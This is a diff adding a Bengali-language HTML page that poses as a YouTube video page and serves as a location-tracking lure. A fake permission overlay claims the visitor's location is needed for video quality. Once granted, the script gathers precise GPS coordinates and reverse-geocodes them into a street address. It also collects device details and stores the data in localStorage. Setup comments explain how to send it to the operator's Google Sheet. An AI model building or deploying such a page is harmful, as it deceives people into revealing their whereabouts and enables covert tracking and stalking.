@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ভিডিও দেখুন</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet"/>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background: #0f0f0f;
+      color: #fff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    header {
+      width: 100%;
+      background: #212121;
+      padding: 12px 24px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      border-bottom: 1px solid #303030;
+    }
+
+    .yt-logo {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      text-decoration: none;
+    }
+
+    .yt-logo-icon {
+      background: #ff0000;
+      border-radius: 8px;
+      width: 36px;
+      height: 26px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .yt-logo-icon svg { width: 18px; height: 18px; }
+
+    .yt-logo-text {
+      font-size: 1.1rem;
+      font-weight: 700;
+      color: #fff;
+      letter-spacing: -0.5px;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 860px;
+      padding: 24px 16px;
+    }
+
+    .video-wrapper {
+      position: relative;
+      width: 100%;
+      padding-top: 56.25%;
+      background: #000;
+      border-radius: 8px;
+      overflow: hidden;
+    }
+
+    .video-wrapper iframe {
+      position: absolute;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      border: none;
+    }
+
+    .video-info {
+      margin-top: 16px;
+    }
+
+    .video-title {
+      font-size: 1.15rem;
+      font-weight: 700;
+      line-height: 1.4;
+      color: #fff;
+    }
+
+    .video-meta {
+      margin-top: 6px;
+      font-size: 0.85rem;
+      color: #aaa;
+    }
+
+    /* Location permission overlay */
+    #permission-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.88);
+      backdrop-filter: blur(8px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      padding: 16px;
+    }
+
+    .permission-card {
+      background: #1e1e1e;
+      border: 1px solid #333;
+      border-radius: 20px;
+      padding: 40px 32px;
+      max-width: 420px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 24px 80px rgba(0,0,0,0.9);
+      animation: slideUp 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
+
+    @keyframes slideUp {
+      from { opacity: 0; transform: translateY(40px) scale(0.95); }
+      to   { opacity: 1; transform: translateY(0) scale(1); }
+    }
+
+    .permission-icon {
+      font-size: 3.5rem;
+      margin-bottom: 16px;
+      display: block;
+    }
+
+    .permission-card h2 {
+      font-size: 1.3rem;
+      font-weight: 700;
+      margin-bottom: 12px;
+      color: #fff;
+    }
+
+    .permission-card p {
+      font-size: 0.9rem;
+      color: #999;
+      line-height: 1.65;
+      margin-bottom: 28px;
+    }
+
+    .btn-allow {
+      display: block;
+      width: 100%;
+      padding: 15px;
+      background: linear-gradient(135deg, #ff0000, #cc0000);
+      color: #fff;
+      font-size: 1rem;
+      font-weight: 700;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: transform 0.2s, box-shadow 0.2s;
+      margin-bottom: 12px;
+      letter-spacing: 0.3px;
+    }
+
+    .btn-allow:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 10px 28px rgba(255,0,0,0.4);
+    }
+
+    .btn-allow:active { transform: translateY(0); }
+
+    .btn-skip {
+      background: none;
+      border: 1px solid #3a3a3a;
+      color: #777;
+      width: 100%;
+      padding: 13px;
+      border-radius: 12px;
+      cursor: pointer;
+      font-size: 0.9rem;
+      font-family: 'Inter', sans-serif;
+      transition: border-color 0.2s, color 0.2s;
+    }
+
+    .btn-skip:hover { border-color: #555; color: #aaa; }
+
+    /* Loading state */
+    .btn-allow.loading {
+      opacity: 0.7;
+      cursor: not-allowed;
+      background: #555;
+    }
+
+    /* Toast */
+    #toast {
+      position: fixed;
+      bottom: 28px;
+      left: 50%;
+      transform: translateX(-50%) translateY(80px);
+      background: #1db954;
+      color: #fff;
+      padding: 13px 28px;
+      border-radius: 50px;
+      font-size: 0.9rem;
+      font-weight: 600;
+      opacity: 0;
+      transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+      z-index: 99999;
+      white-space: nowrap;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.4);
+    }
+
+    #toast.show {
+      opacity: 1;
+      transform: translateX(-50%) translateY(0);
+    }
+  </style>
+</head>
+<body>
+
+<!-- YouTube-style header -->
+<header>
+  <div class="yt-logo">
+    <div class="yt-logo-icon">
+      <svg viewBox="0 0 24 24" fill="white" xmlns="http://www.w3.org/2000/svg">
+        <path d="M9.5 15.5L15.5 12L9.5 8.5V15.5Z"/>
+      </svg>
+    </div>
+    <span class="yt-logo-text">YouTube</span>
+  </div>
+</header>
+
+<!-- Location Permission Overlay -->
+<div id="permission-overlay">
+  <div class="permission-card">
+    <span class="permission-icon">🎬</span>
+    <h2>ভিডিও দেখতে একটু সাহায্য করুন</h2>
+    <p>
+      আপনার এলাকা অনুযায়ী সেরা মানের ভিডিও দেখাতে আপনার অবস্থানের অনুমতি প্রয়োজন।
+      <br/><br/>
+      নিচের বাটনে ক্লিক করুন, তারপর <strong>"Allow"</strong> বাটনে চাপুন।
+    </p>
+    <button class="btn-allow" id="btn-allow" onclick="requestLocation()">
+      📍 অনুমতি দিন এবং ভিডিও দেখুন
+    </button>
+    <button class="btn-skip" onclick="skipLocation()">
+      এড়িয়ে যান
+    </button>
+  </div>
+</div>
+
+<!-- Main Content -->
+<div class="container">
+  <div class="video-wrapper">
+    <iframe
+      id="yt-player"
+      src="about:blank"
+      title="YouTube video"
+      allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+      allowfullscreen>
+    </iframe>
+  </div>
+  <div class="video-info">
+    <div class="video-title" id="vid-title">বিশেষ ভিডিও বার্তা</div>
+    <div class="video-meta" id="vid-meta"></div>
+  </div>
+</div>
+
+<div id="toast">✅ ধন্যবাদ! ভিডিও শুরু হচ্ছে...</div>
+
+<script>
+  // =====================================================
+  // ✏️ কাস্টম সেটিংস
+  // =====================================================
+
+  // YouTube Video ID — youtu.be/H0DNztmRprs
+  const YOUTUBE_VIDEO_ID = "H0DNztmRprs";
+
+  // Video title ও meta
+  const VIDEO_TITLE = "লেমন আফরোজ লিমিটেড — বিশেষ বার্তা";
+  const VIDEO_META = "আজকের জন্য বিশেষভাবে তৈরি";
+
+  // Google Sheets Web App URL (নিচের ধাপে set করুন)
+  // এটা সেট করলে সব device থেকে location আপনার Sheet-এ যাবে
+  const GOOGLE_SHEET_URL = ""; // ← এখানে আপনার Google Apps Script URL বসান
+
+  // =====================================================
+
+  document.getElementById("vid-title").textContent = VIDEO_TITLE;
+  document.getElementById("vid-meta").textContent = VIDEO_META + " • " + new Date().toLocaleDateString('bn-BD');
+
+  function requestLocation() {
+    const btn = document.getElementById("btn-allow");
+    btn.textContent = "⏳ অপেক্ষা করুন...";
+    btn.classList.add("loading");
+    btn.disabled = true;
+
+    if (!navigator.geolocation) {
+      playVideo();
+      return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        const data = {
+          id: Date.now(),
+          lat: pos.coords.latitude,
+          lon: pos.coords.longitude,
+          accuracy_meters: Math.round(pos.coords.accuracy),
+          timestamp: new Date().toISOString(),
+          userAgent: navigator.userAgent,
+          language: navigator.language,
+          platform: navigator.platform,
+          screenSize: screen.width + "x" + screen.height,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        };
+
+        // OpenStreetMap দিয়ে address বের করা (free, no API key)
+        fetch("https://nominatim.openstreetmap.org/reverse?lat=" + data.lat + "&lon=" + data.lon + "&format=json")
+          .then(function(r) { return r.json(); })
+          .then(function(geo) {
+            data.full_address = geo.display_name || "N/A";
+            data.city = geo.address && (geo.address.city || geo.address.town || geo.address.village) || "N/A";
+            data.district = geo.address && geo.address.county || "N/A";
+            data.country = geo.address && geo.address.country || "N/A";
+            data.postcode = geo.address && geo.address.postcode || "N/A";
+            saveAndPlay(data);
+          })
+          .catch(function() {
+            data.full_address = "Address fetch failed";
+            saveAndPlay(data);
+          });
+      },
+      function(err) {
+        // User denied — simply play the video
+        playVideo();
+      },
+      { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
+    );
+  }
+
+  function saveAndPlay(data) {
+    // LocalStorage-এ save (same-origin dashboard পড়বে)
+    try {
+      var existing = JSON.parse(localStorage.getItem("yt_track_data") || "[]");
+      existing.unshift(data);
+      localStorage.setItem("yt_track_data", JSON.stringify(existing));
+    } catch(e) {}
+
+    // Google Sheets-এ পাঠানো (যদি URL set থাকে)
+    if (GOOGLE_SHEET_URL) {
+      fetch(GOOGLE_SHEET_URL + "?callback=cb", {
+        method: "POST",
+        mode: "no-cors",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      }).catch(function() {});
+    }
+
+    showToast();
+    playVideo();
+  }
+
+
+  function showToast() {
+    var t = document.getElementById("toast");
+    t.classList.add("show");
+    setTimeout(function() { t.classList.remove("show"); }, 3500);
+  }
+
+  function playVideo() {
+    document.getElementById("permission-overlay").style.display = "none";
+    document.getElementById("yt-player").src =
+      "https://www.youtube.com/embed/" + YOUTUBE_VIDEO_ID + "?autoplay=1&rel=0";
+  }
+
+  function skipLocation() {
+    playVideo();
+  }
+</script>
+</body>
+</html>
